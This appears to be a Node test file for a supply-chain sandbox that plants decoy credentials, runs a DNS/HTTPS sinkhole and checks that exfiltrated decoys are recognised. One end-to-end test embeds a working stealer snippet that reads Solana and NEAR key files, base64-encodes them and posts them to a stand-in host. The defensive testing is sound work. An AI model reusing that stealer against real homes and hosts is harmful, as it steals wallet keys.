import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import dgram from 'node:dgram';
import { mkdtemp, readFile, rm } from 'node:fs/promises';
import http from 'node:http';
import https from 'node:https';
import os from 'node:os';
import path from 'node:path';
import { after, before, describe, it } from 'node:test';
import { gzipSync } from 'node:zlib';
import { DECOYS, decoyFiles, decoyTokens, newMarker } from '../sandbox/decoys.ts';
import { decoysIn } from '../sandbox/payload.ts';
import { buildQuery, makeCa, parseQuery, startSinkhole } from '../sandbox/vm/sinkhole.mjs';

describe('decoysIn', () => {
  const marker = newMarker();
  const tokens = decoyTokens(marker);
  const files = decoyFiles(marker);
  const content = (label: string) => files[DECOYS.findIndex((d) => d.label === label)]!.content;

  it('finds every decoy in its own file, whatever form its token takes there', () => {
    for (const [i, d] of DECOYS.entries()) {
      assert.ok(decoysIn(Buffer.from(files[i]!.content), tokens).includes(d.label), `${d.label} (${d.file})`);
    }
  });

  it('sees through the wrapping stealers use: JSON, base64, gzip, hex and URL encoding', () => {
    const sol = content('Solana CLI keypair');
    const phantom = content('Phantom (Chrome)');
    const ssh = content('SSH key');
    const blob = JSON.stringify([{ p: 'id.json', d: Buffer.from(sol).toString('base64') }, { p: 'phantom', d: phantom }]);
    assert.deepEqual(decoysIn(Buffer.from(blob), tokens), ['Phantom (Chrome)', 'Solana CLI keypair']);
    assert.deepEqual(decoysIn(Buffer.from(Buffer.from(blob).toString('base64')), tokens), ['Phantom (Chrome)', 'Solana CLI keypair']);
    assert.deepEqual(decoysIn(Buffer.from(gzipSync(Buffer.from(ssh)).toString('base64')), tokens), ['SSH key']);
    assert.deepEqual(decoysIn(Buffer.from(Buffer.from(ssh).toString('hex')), tokens), ['SSH key']);
    assert.deepEqual(decoysIn(Buffer.from(`data=${encodeURIComponent(sol)}`), tokens), ['Solana CLI keypair']);
  });

  it('finds nothing in bytes that carry no decoy, or another run\'s decoys', () => {
    assert.deepEqual(decoysIn(Buffer.from('{"hello":"world","n":[1,2,3]}'), tokens), []);
    const other = decoyFiles(newMarker());
    assert.deepEqual(decoysIn(Buffer.from(other.map((f) => f.content).join('\n')), tokens), []);
  });
});

describe('sinkhole', () => {
  let dir: string;
  let upstream: dgram.Socket;
  let sink: Awaited<ReturnType<typeof startSinkhole>>;
  const hasOpenssl = !spawnSync('openssl', ['version']).error;

  const ask = (port: number, name: string, type = 1) =>
    new Promise<Buffer>((resolve, reject) => {
      const s = dgram.createSocket('udp4');
      s.on('message', (m) => {
        s.close();
        resolve(m);
      });
      s.on('error', reject);
      s.send(buildQuery(4242, name, type), port, '127.0.0.1');
    });
  const logged = async () => (await readFile(path.join(dir, 'capture.jsonl'), 'utf8')).trim().split('\n').map((l) => JSON.parse(l) as Record<string, unknown>);

  before(async () => {
    dir = await mkdtemp(path.join(os.tmpdir(), 'sinkhole-test-'));
    // A stand-in for the VM's real resolver: answers every query with 9.9.9.9.
    upstream = dgram.createSocket('udp4');
    upstream.on('message', (m, r) => {
      const reply = Buffer.from(m);
      reply.writeUInt16BE(0x8180, 2);
      upstream.send(Buffer.concat([reply, Buffer.from([0xc0, 0x0c, 0, 1, 0, 1, 0, 0, 0, 60, 0, 4, 9, 9, 9, 9])]), r.port, r.address);
    });
    await new Promise<void>((r) => upstream.bind(0, '127.0.0.1', () => r()));
    if (hasOpenssl) makeCa(path.join(dir, 'ca'));
    sink = await startSinkhole({
      dnsPort: 0,
      httpPort: 0,
      httpsPort: 0,
      upstream: '127.0.0.1',
      upstreamPort: upstream.address().port,
      allow: ['registry.npmjs.org'],
      log: path.join(dir, 'capture.jsonl'),
      ...(hasOpenssl ? { caDir: path.join(dir, 'ca') } : {}),
    });
  });

  after(async () => {
    sink.close();
    upstream.close();
    await rm(dir, { recursive: true, force: true });
  });

  it('answers every name but the registries with itself, and passes the registries through', async () => {
    const evil = await ask(sink.ports.dns, 'api.collector.invalid');
    assert.deepEqual([...evil.subarray(-4)], [127, 0, 0, 1]);
    assert.equal(evil.readUInt16BE(0), 4242);
    const real = await ask(sink.ports.dns, 'registry.npmjs.org');
    assert.deepEqual([...real.subarray(-4)], [9, 9, 9, 9]);
    const v6 = await ask(sink.ports.dns, 'api.collector.invalid', 28);
    assert.equal(v6.readUInt16BE(6), 0, 'no AAAA records, so clients fall back to IPv4 and reach the sinkhole');
    const names = (await logged()).filter((e) => e.t === 'dns').map((e) => [e.name, e.allowed]);
    assert.deepEqual(names.slice(0, 2), [['api.collector.invalid', false], ['registry.npmjs.org', true]]);
    assert.equal(parseQuery(buildQuery(1, 'a.b.c'))?.name, 'a.b.c');
  });

  it('keeps the exact bytes a plain HTTP request carried', async () => {
    const body = JSON.stringify({ wallet: 'AIRLOCKdeadbeef' });
    await new Promise<void>((resolve, reject) => {
      const req = http.request({ host: '127.0.0.1', port: sink.ports.http, method: 'POST', path: '/v1/register', headers: { host: 'api.collector.invalid', 'content-type': 'application/json' } }, (res) => {
        res.resume();
        res.on('end', () => resolve());
      });
      req.on('error', reject);
      req.end(body);
    });
    const hit = (await logged()).find((e) => e.t === 'http' && e.path === '/v1/register')!;
    assert.equal(hit.host, 'api.collector.invalid');
    assert.equal(hit.method, 'POST');
    assert.equal(hit.tls, false);
    assert.equal(Buffer.from(String(hit.body), 'base64').toString(), body);
  });

  it('opens HTTPS with a certificate signed for the name the code asked for', async (t) => {
    if (!hasOpenssl) return t.skip('openssl is not installed here');
    const ca = await readFile(path.join(dir, 'ca', 'ca.crt'));
    const status = await new Promise<number>((resolve, reject) => {
      const req = https.request({ host: '127.0.0.1', port: sink.ports.https, servername: 'metrics.stealer.invalid', ca, method: 'POST', path: '/ingest', headers: { host: 'metrics.stealer.invalid' } }, (res) => {
        res.resume();
        res.on('end', () => resolve(res.statusCode ?? 0));
      });
      req.on('error', reject);
      req.end('c2VjcmV0');
    });
    assert.equal(status, 200);
    const hit = (await logged()).find((e) => e.t === 'http' && e.path === '/ingest')!;
    assert.deepEqual([hit.host, hit.tls, Buffer.from(String(hit.body), 'base64').toString()], ['metrics.stealer.invalid', true, 'c2VjcmV0']);
  });

  it('notes a client that refuses its certificate', async (t) => {
    if (!hasOpenssl) return t.skip('openssl is not installed here');
    await new Promise<void>((resolve) => {
      const req = https.request({ host: '127.0.0.1', port: sink.ports.https, servername: 'pinned.example.invalid', path: '/' }, () => resolve());
      req.on('error', () => resolve());
      req.end();
    });
    await new Promise((r) => setTimeout(r, 100));
    const refused = (await logged()).find((e) => e.t === 'tls-refused');
    assert.equal(refused?.host, 'pinned.example.invalid');
  });
});

describe('sinkhole end to end', () => {
  it('catches a separate process sending decoys over HTTPS, trusting the run\'s CA only through NODE_EXTRA_CA_CERTS', async (t) => {
    if (spawnSync('openssl', ['version']).error) return t.skip('openssl is not installed here');
    const { readCapture } = await import('../sandbox/capture.ts');
    const { mkdir, writeFile } = await import('node:fs/promises');
    const dir = await mkdtemp(path.join(os.tmpdir(), 'sinkhole-e2e-'));
    try {
      // A decoy home in a temporary folder: the stand-in stealer reads this, never the real home.
      const home = path.join(dir, 'home');
      const marker = newMarker();
      for (const f of decoyFiles(marker, '/home/dev')) {
        const target = path.join(home, f.path.slice('/home/dev/'.length));
        await mkdir(path.dirname(target), { recursive: true });
        await writeFile(target, f.content);
      }
      makeCa(path.join(dir, 'ca'));
      const sink = await startSinkhole({ dnsPort: 0, httpPort: 0, httpsPort: 0, log: path.join(dir, 'capture.jsonl'), caDir: path.join(dir, 'ca') });
      try {
        const stealer = [
          "const fs=require('fs'),os=require('os'),path=require('path'),https=require('https');",
          "const h=os.homedir(); const grab=(p)=>{try{const s=fs.statSync(p);return s.isDirectory()?fs.readdirSync(p).map(f=>fs.readFileSync(path.join(p,f),'utf8')).join(''):fs.readFileSync(p,'utf8')}catch{return ''}};",
          "const blob=Buffer.from(JSON.stringify([grab(path.join(h,'.config/solana/id.json')),grab(path.join(h,'.near-credentials/mainnet/dev-treasury.near.json'))])).toString('base64');",
          `const r=https.request({host:'127.0.0.1',port:${sink.ports.https},servername:'api.test-only.invalid',method:'POST',path:'/x',headers:{host:'api.test-only.invalid'}},(res)=>{res.resume();res.on('end',()=>process.exit(0))});`,
          "r.on('error',(e)=>{console.error(e.message);process.exit(3)});r.end(blob);",
        ].join('\n');
        // Async: the sinkhole runs in this process, so a blocking spawn would starve it.
        const { execFile } = await import('node:child_process');
        const run = await new Promise<{ code: number | null; stderr: string }>((resolve) => {
          execFile(
            process.execPath,
            ['-e', stealer],
            { env: { ...process.env, HOME: home, USERPROFILE: home, NODE_EXTRA_CA_CERTS: path.join(dir, 'ca', 'ca.crt') }, timeout: 20_000 },
            (error, _out, stderr) => resolve({ code: error ? ((error as { code?: number }).code ?? 1) : 0, stderr: String(stderr) }),
          );
        });
        assert.equal(run.code, 0, `the stand-in stealer should reach the sinkhole: ${run.stderr}`);
        const r = readCapture(await readFile(path.join(dir, 'capture.jsonl'), 'utf8'), { tokens: decoyTokens(marker), steps: [{ label: 'npm install', start: 0, end: Date.now() + 1000 }], contacts: [] });
        assert.equal(r.exfil.length, 1);
        assert.deepEqual([r.exfil[0]!.host, r.exfil[0]!.tls, r.exfil[0]!.decoys], ['api.test-only.invalid', true, ['NEAR CLI keys', 'Solana CLI keypair']]);
      } finally {
        sink.close();
      }
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});
